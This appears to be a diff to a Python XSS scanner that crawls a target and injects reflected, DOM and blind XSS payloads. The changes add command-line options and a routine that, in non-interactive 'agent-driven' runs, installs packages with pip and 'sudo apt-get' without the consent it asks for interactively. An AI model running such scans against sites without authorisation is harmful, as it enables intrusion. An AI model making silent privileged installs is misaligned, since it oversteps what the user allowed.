@@ -13,13 +13,30 @@ import random
 import string
 import threading
 import concurrent.futures
+import importlib
+import shutil
+import subprocess
 from bs4 import BeautifulSoup
 from collections import deque
 from urllib.parse import urljoin, urlparse
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, WebDriverException
 import sys
+import argparse
+
+try:
+    from selenium import webdriver as _webdriver
+    from selenium.webdriver.chrome.options import Options as _Options
+    from selenium.common.exceptions import TimeoutException as _TimeoutException, UnexpectedAlertPresentException as _UnexpectedAlertPresentException
+    webdriver = _webdriver
+    Options = _Options
+    TimeoutException = _TimeoutException
+    UnexpectedAlertPresentException = _UnexpectedAlertPresentException
+    SELENIUM_AVAILABLE = True
+except ImportError:
+    webdriver = None
+    Options = None
+    TimeoutException = Exception
+    UnexpectedAlertPresentException = Exception
+    SELENIUM_AVAILABLE = False
 
 # ===================== CONFIGURATION =====================
 REQUEST_TIMEOUT = 10
@@ -65,6 +82,127 @@ BUILTIN_PAYLOADS = [
     "%253Cscript%253Ealert(1)%253C/script%253E",
 ]
 
+
+def _load_selenium_modules():
+    global SELENIUM_AVAILABLE, webdriver, Options, TimeoutException, UnexpectedAlertPresentException
+    try:
+        selenium_module = importlib.import_module("selenium")
+        webdriver = importlib.import_module("selenium.webdriver")
+        chrome_options_mod = importlib.import_module("selenium.webdriver.chrome.options")
+        exceptions_mod = importlib.import_module("selenium.common.exceptions")
+        Options = chrome_options_mod.Options
+        TimeoutException = exceptions_mod.TimeoutException
+        UnexpectedAlertPresentException = exceptions_mod.UnexpectedAlertPresentException
+        SELENIUM_AVAILABLE = True
+        _ = selenium_module  # silence lint-like tools
+        return True
+    except Exception:
+        SELENIUM_AVAILABLE = False
+        return False
+
+
+def _browser_binary_available():
+    for binary in ("google-chrome", "google-chrome-stable", "chromium", "chromium-browser"):
+        if shutil.which(binary):
+            return True
+    return False
+
+
+def _install_with_pip(package_name):
+    cmds = [
+        [sys.executable, "-m", "pip", "install", "--user", package_name],
+        [sys.executable, "-m", "pip", "install", "--user", "--break-system-packages", package_name],
+    ]
+    for cmd in cmds:
+        try:
+            proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
+        except Exception:
+            continue
+        if proc.returncode == 0:
+            return True
+    return False
+
+
+def _try_install_browser_linux():
+    if shutil.which("apt-get"):
+        cmds = [
+            ["sudo", "apt-get", "update"],
+            ["sudo", "apt-get", "install", "-y", "chromium-browser", "chromium-chromedriver"],
+        ]
+        for cmd in cmds:
+            try:
+                proc = subprocess.run(cmd, check=False)
+            except Exception:
+                return False
+            if proc.returncode != 0:
+                return False
+        return True
+    return False
+
+
+def ensure_dom_dependencies(use_headless, interactive=True):
+    if not use_headless:
+        return True, ["DOM mode not requested."]
+
+    notes = []
+    selenium_ok = SELENIUM_AVAILABLE or _load_selenium_modules()
+    browser_ok = _browser_binary_available()
+
+    if selenium_ok and browser_ok:
+        return True, ["Selenium and browser dependencies are available."]
+
+    notes.append("DOM mode requested but dependencies are missing.")
+    if not interactive:
+        # In non-interactive runs (agent-driven), try automatic installs so DOM
+        # checks can proceed when possible.
+        if not selenium_ok:
+            if _install_with_pip("selenium"):
+                selenium_ok = _load_selenium_modules()
+                if selenium_ok:
+                    notes.append("Installed selenium via pip (non-interactive mode).")
+                else:
+                    notes.append("Selenium install attempted but import still failed.")
+            else:
+                notes.append("Failed to install selenium via pip (non-interactive mode).")
+        if not browser_ok:
+            if _try_install_browser_linux():
+                browser_ok = _browser_binary_available()
+                if browser_ok:
+                    notes.append("Installed Chromium/browser dependencies (non-interactive mode).")
+                else:
+                    notes.append("Browser install attempted but binary still not found.")
+            else:
+                notes.append("Automatic browser install failed (non-interactive mode).")
+        return selenium_ok and browser_ok, notes
+
+    print("[!] DOM dependencies missing.")
+    if not selenium_ok:
+        consent = ask_yes_no("Install missing python package 'selenium' automatically?")
+        if consent:
+            if _install_with_pip("selenium"):
+                selenium_ok = _load_selenium_modules()
+                notes.append("Installed selenium via pip.")
+            else:
+                notes.append("Failed to install selenium via pip.")
+        else:
+            notes.append("User declined selenium install.")
+
+    if not browser_ok:
+        consent = ask_yes_no("Browser binary not found. Try installing Chromium automatically? (Linux apt)")
+        if consent:
+            if _try_install_browser_linux():
+                browser_ok = _browser_binary_available()
+                if browser_ok:
+                    notes.append("Installed Chromium/browser dependencies.")
+                else:
+                    notes.append("Browser install attempted but binary still not found.")
+            else:
+                notes.append("Automatic browser install failed.")
+        else:
+            notes.append("User declined browser install.")
+
+    return selenium_ok and browser_ok, notes
+
 # ===================== UTILITY FUNCTIONS =====================
 def load_payloads():
     """Load payloads from file or return built-in list."""
@@ -90,6 +228,16 @@ def get_cookies_from_user():
         for part in cookie_str.split(';'):
             if '=' in part:
                 name, value = part.strip().split('=',1)
+                cookies[name] = value
+    return cookies
+
+
+def parse_cookies(cookie_str):
+    cookies = {}
+    if cookie_str:
+        for part in cookie_str.split(';'):
+            if '=' in part:
+                name, value = part.strip().split('=', 1)
                 cookies[name] = value
     return cookies
 
@@ -221,7 +369,10 @@ class XSSTester:
         self.use_headless = use_headless
         self.collaborator = collaborator  # e.g., "http://your-collaborator.net"
         self.driver = None
-        if use_headless:
+        if use_headless and not SELENIUM_AVAILABLE:
+            print("[!] Selenium not installed; DOM XSS testing disabled.")
+            self.use_headless = False
+        elif use_headless:
             try:
                 chrome_options = Options()
                 chrome_options.add_argument("--headless")
@@ -396,22 +547,49 @@ def is_wordpress(base_url, session):
 
 # ===================== MAIN SCANNER =====================
 def main():
+    parser = argparse.ArgumentParser(description="Aggressive Unified XSS Scanner")
+    parser.add_argument("--target", help="Target URL/domain to scan")
+    parser.add_argument("--depth", type=int, default=2, help="Crawler depth (default: 2)")
+    parser.add_argument("--headless", action="store_true", help="Enable headless DOM testing via selenium")
+    parser.add_argument("--cookies", default="", help="Cookies in 'name=value; name2=value2' format")
+    parser.add_argument("--collaborator", default="", help="Collaborator URL for blind XSS payload injection")
+    parser.add_argument("--output", default="", help="Output JSON report path")
+    args = parser.parse_args()
+
     print("=== AGGRESSIVE UNIFIED XSS SCANNER ===\n")
-    target = input("Enter target URL (e.g., https://example.com): ").strip()
-    if not target.startswith('http'):
-        target = 'http://' + target
+    if args.target:
+        target = args.target.strip()
+        if not target.startswith("http"):
+            target = "https://" + target
+        depth = max(0, args.depth)
+        use_headless = bool(args.headless)
+        cookies = parse_cookies(args.cookies)
+        collaborator = (args.collaborator or "").strip()
+        if collaborator and not collaborator.startswith("http"):
+            collaborator = "http://" + collaborator
+    else:
+        target = input("Enter target URL (e.g., https://example.com): ").strip()
+        if not target.startswith('http'):
+            target = 'http://' + target
 
-    try:
-        depth = int(input("Crawl depth (default 2): ").strip() or "2")
-    except:
-        depth = 2
+        try:
+            depth = int(input("Crawl depth (default 2): ").strip() or "2")
+        except:
+            depth = 2
 
-    use_headless = ask_yes_no("Use headless browser for DOM XSS? (requires Selenium)")
-    cookies = get_cookies_from_user()
+        use_headless = ask_yes_no("Use headless browser for DOM XSS? (requires Selenium)")
+        cookies = get_cookies_from_user()
 
-    collaborator = input("Enter collaborator URL for blind XSS (e.g., http://your.burpcollaborator.net) or leave blank: ").strip()
-    if collaborator and not collaborator.startswith('http'):
-        collaborator = 'http://' + collaborator
+        collaborator = input("Enter collaborator URL for blind XSS (e.g., http://your.burpcollaborator.net) or leave blank: ").strip()
+        if collaborator and not collaborator.startswith('http'):
+            collaborator = 'http://' + collaborator
+
+    deps_ok, dep_notes = ensure_dom_dependencies(use_headless, interactive=not bool(args.target))
+    for note in dep_notes:
+        print(f"[*] {note}")
+    if use_headless and not deps_ok:
+        print("[!] Continuing without DOM browser checks because dependencies are unavailable.")
+        use_headless = False
 
     session = requests.Session()
     session.headers.update(HEADERS)
@@ -580,7 +758,9 @@ def main():
     if collaborator:
         print(f"[*] Blind XSS payloads injected; check your collaborator at {collaborator} for callbacks.")
 
-    output_file = input("\nSave report to file (optional, press Enter to skip): ").strip()
+    output_file = (args.output or "").strip()
+    if not output_file and not args.target:
+        output_file = input("\nSave report to file (optional, press Enter to skip): ").strip()
     if output_file:
         with open(output_file, 'w') as f:
             json.dump(findings, f, indent=2)
